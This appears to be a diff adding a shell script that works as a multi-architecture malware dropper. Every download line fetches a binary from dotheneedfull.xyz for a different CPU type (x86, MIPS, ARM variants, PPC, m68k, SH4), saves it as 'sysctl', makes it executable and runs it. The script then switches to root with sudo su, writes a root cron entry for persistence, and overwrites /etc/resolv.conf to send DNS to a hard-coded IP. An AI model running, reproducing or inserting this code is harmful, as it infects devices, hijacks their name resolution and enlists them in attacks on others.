@@ -1,0 +1,19 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://dotheneedfull.xyz/fetch.x86; curl -O http://dotheneedfull.xyz/fetch.x86;cat fetch.x86 >sysctl;chmod +x *;./sysctl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://dotheneedfull.xyz/fetch.mips; curl -O http://dotheneedfull.xyz/fetch.mips;cat fetch.mips >sysctl;chmod +x *;./sysctl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://dotheneedfull.xyz/fetch.mpsl; curl -O http://dotheneedfull.xyz/fetch.mpsl;cat fetch.mpsl >sysctl;chmod +x *;./sysctl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://dotheneedfull.xyz/fetch.arm4; curl -O http://dotheneedfull.xyz/fetch.arm4;cat fetch.arm4 >sysctl;chmod +x *;./sysctl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://dotheneedfull.xyz/fetch.arm5; curl -O http://dotheneedfull.xyz/fetch.arm5;cat fetch.arm5 >sysctl;chmod +x *;./sysctl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://dotheneedfull.xyz/fetch.arm6; curl -O http://dotheneedfull.xyz/fetch.arm6;cat fetch.arm6 >sysctl;chmod +x *;./sysctl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://dotheneedfull.xyz/fetch.arm7; curl -O http://dotheneedfull.xyz/fetch.arm7;cat fetch.arm7 >sysctl;chmod +x *;./sysctl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://dotheneedfull.xyz/fetch.ppc; curl -O http://dotheneedfull.xyz/fetch.ppc;cat fetch.ppc >sysctl;chmod +x *;./sysctl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://dotheneedfull.xyz/fetch.m68k; curl -O http://dotheneedfull.xyz/fetch.m68k;cat fetch.m68k >sysctl;chmod +x *;./sysctl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://dotheneedfull.xyz/fetch.sh4; curl -O http://dotheneedfull.xyz/fetch.sh4;cat fetch.sh4 >sysctl;chmod +x *;./sysctl
+sudo su
+
+echo > /etc/cron.d/start
+echo "00 00   * * *   root    PATH="$PATH:/var/run/sysctl"" > /etc/cron.d/start
+echo > /etc/resolv.conf
+echo "46.239.223.80" > /etc/resolv.conf
+
+
+
